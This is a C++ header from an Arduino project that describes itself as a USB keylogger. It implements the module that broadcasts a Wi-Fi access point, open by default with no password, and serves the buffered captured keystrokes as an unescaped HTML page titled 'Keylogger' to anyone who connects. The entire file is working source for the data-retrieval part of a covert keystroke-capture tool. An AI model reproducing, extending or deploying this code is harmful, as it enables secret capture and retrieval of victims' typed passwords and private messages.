#ifndef EMBD_ENV_WLAN_WEBSERVER_HPP
#define EMBD_ENV_WLAN_WEBSERVER_HPP

// Handler for result propagation over WLAN for USB keylogger
// See https://github.com/gereonsuch/keylogger for more information
// Copyright (C) 2026 Gereon Such

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

#include <Arduino.h>
#include <WiFi.h>

template <unsigned ReqBufSize = 1024u, unsigned ContentBufSize = 1024u*4u>
class WLANOutputHandler {
    const char* _ssid;
    const char* _password;
    uint8_t _channel;
    uint16_t _http_port;
    IPAddress _ip;
    IPAddress _gateway;
    IPAddress _netmask;
    WiFiServer _server;
    bool _running;

    char _content_buffer[ContentBufSize];
    unsigned _n {0};

public:
    WLANOutputHandler(const char* ssid,
                      const char* password = "",
                      uint8_t channel = 6,
                      uint16_t _http_port = 80,
                      IPAddress ip = IPAddress(192, 168, 4, 1),
                      IPAddress gateway = IPAddress(192, 168, 4, 1),
                      IPAddress netmask = IPAddress(255, 255, 255, 0))
        : _ssid(ssid)
        , _password(password)
        , _channel(channel)
        , _http_port(_http_port)
        , _ip(ip)
        , _gateway(gateway)
        , _netmask(netmask)
        , _server(_http_port)
        , _running(false)
    {}

    ~WLANOutputHandler() { stop(); }

public: // content methods

    void resetContent() { _n = 0; }

    void appendContent(const char* content, unsigned len) {
        for(unsigned i = 0; i < len; i++) {
            if(_n >= ContentBufSize) { 
                // content buffer full, simply erase first half of content. This will suffice in most cases
                unsigned offset = ContentBufSize / 2u + 1u;
                unsigned kout = 0;
                for(; offset < ContentBufSize && offset < _n; kout++, offset++)
                    _content_buffer[kout] = _content_buffer[offset];
                _n = kout;
            }

            _content_buffer[_n++] = content[i]; // place at end
        }
    }

public: // web server methods

    template <unsigned MAX_RETRIES = 20, unsigned RETRY_DELAY_MS = 500>
    bool start() {
        WiFi.end();
        delay(200);
        WiFi.mode(WIFI_AP);
        delay(100);

        const int begin_status = (*_password)
                                ? WiFi.beginAP(_ssid, _password, _channel)
                                : WiFi.beginAP(_ssid);

        for (uint8_t i = 1; i <= MAX_RETRIES; i++) {
            const int status = WiFi.status();
            
            if (status == WL_AP_LISTENING || status == WL_AP_CONNECTED || status == WL_CONNECTED) {
                _ip = WiFi.softAPIP();
                _server.stop();
                _server = WiFiServer(_http_port);
                _server.begin();

                _running = true;
                return true;
            }

            delay(RETRY_DELAY_MS);
        }

        return false;
    }

    void stop() {
        if (!_running) return;
        _server.end();
        WiFi.end();
        _running = false;
    }

    bool poll() {
        WiFiClient client = _server.available();
        if (!client) return false;

        handle_client(client);
        return true;
    }

protected:

    void handle_client(WiFiClient& client) {
        char req[ReqBufSize] = {};
        size_t req_len = 0;

        const unsigned long deadline = millis() + 200;
        while (client.connected() && millis() < deadline) {
            if (!client.available()) { delay(1); continue; }
            while (client.available() && req_len < ReqBufSize - 1)
                req[req_len++] = static_cast<char>(client.read());
            if (strstr(req, "\r\n\r\n")) break;
        }

        if (req_len) {
            // no content length to write content to client without knowing the final size. 
            client.print("HTTP/1.1 200 OK\r\n");
            client.print("Content-Type: text/html; charset=utf-8\r\n");
            client.print("Connection: close\r\n");
            client.print("\r\n");

            client.print("<html>\n"
                "<head><title>Keylogger</title></head>\n"
                "<body>\n"
                "<h1>Keylogger</h1>\n"
                "<pre>\n"); // newlines should be viewed directly
            
            if(_n > 0u)
                client.write(reinterpret_cast<const uint8_t*>(_content_buffer), _n);

            client.print("\n</pre>\n</body>\n</html>\n");
        }
        client.stop();
    }
};

#endif // EMBD_ENV_WLAN_WEBSERVER_HPP
